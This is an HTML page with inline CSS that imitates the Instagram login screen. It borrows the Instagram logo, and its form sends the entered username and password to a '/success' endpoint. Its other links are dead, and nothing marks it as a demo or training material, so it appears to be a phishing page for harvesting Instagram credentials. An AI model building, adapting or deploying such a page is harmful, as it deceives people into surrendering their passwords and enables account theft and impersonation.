<link href="https://fonts.googleapis.com/css?family=Indie+Flower|Overpass+Mono" rel="stylesheet">
<div id="wrapper">
  <div class="main-content">
    <div class="header">
      <img src="https://www.vippng.com/png/full/34-343738_instagram-logo-vectors-png-free-download-instagram-name.png" />
    </div>
    <form method="GET|POST" , enctype="multipart/form-data" action='/success'>
      <div class="l-part"> 
          <a type="text" name=" "></a>
          <input type="text" name="user" placeholder="Username" class="input-1 playing" />
          <div class="overlap-text">
            <input type="password" name="pass" placeholder="Password" class="input-2" />
            <a href="#">Forgot?</a>
          </div>
          <input type="submit" value="Log in" class="btn"/>
      </div>    
    </form>
  </div>
  <div class="sub-content">
    <div class="s-part">
      Don't have an account?<a href="#">Sign up</a>
    </div>
  </div>    
  <br>
  <br>
  <a class="input-3">Get the app.</a>
</div>
<style>
    
* {
    margin: 0px;
    padding: 0px;
  }
  
  body {
    background-color: #eee;
  }
  
  #wrapper {
    width: 500px;
    height: 50%;
    overflow: hidden;
    border: 0px solid #000;
    margin: 50px auto;
    padding: 10px;
  }
  
  .main-content {
    width: 250px;
    height: 40%;
    margin: 10px auto;
    margin-top: 100px;
    background-color: #fff;
    border: 2px solid #e6e6e6;
    padding: 40px 50px;
  }
  
  .header {
    border: 0px solid #000;
    margin-bottom: 5px;
  }
  
  .header img {
    height: 50px;
    width: 175px;
    margin: auto;
    position: relative;
    left: 40px;
  }
  
  .input-1,
  .input-2 {
    width: 100%;
    margin-bottom: 5px;
    padding: 8px 12px;
    border: 1px solid #dbdbdb;
    box-sizing: border-box;
    border-radius: 3px;
  }

  .input-1 .playing,
  .input-2 .playing {
    border: 1px solid #dbdbdb;
    box-sizing: border-box;
  }  

  .input-3 {
    width: 100%;
    margin-bottom: 5px;
    margin-left: 175px;
    padding: 8px 12px;
    background-color: #eee;
    font-size: 14px;
    text-decoration: none;
    font-family: 'Overpass Mono', monospace;
    text-align: center;
  }
  
  .overlap-text {
    position: relative;
  }
  
  .overlap-text a {
    position: absolute;
    top: 8px;
    right: 10px;
    color: #003569;
    font-size: 14px;
    text-decoration: none;
    font-family: 'Overpass Mono', monospace;
    letter-spacing: -1px;
  }
  
  .btn {
    width: 100%;
    background-color: #3897f0;
    border: 1px solid #3897f0;
    padding: 5px 12px;
    color: #fff;
    font-weight: bold;
    cursor: pointer;
    border-radius: 3px;
  }
  
  .sub-content {
    width: 250px;
    height: 5%;
    margin: 10px auto;
    border: 1px solid #e6e6e6;
    padding: 10px 50px;
    background-color: #fff;
  }
  
  .s-part {
    text-align: center;
    font-family: 'Overpass Mono', monospace;
    word-spacing: -3px;
    letter-spacing: -2px;
    font-weight: normal;
  }
  
  .s-part a {
    text-decoration: none;
    cursor: pointer;
    color: #3897f0;
    font-family: 'Overpass Mono', monospace;
    word-spacing: -3px;
    letter-spacing: -2px;
    font-weight: normal;
  }
  
  input:focus {
      background-color: #fff;
  }

</style>
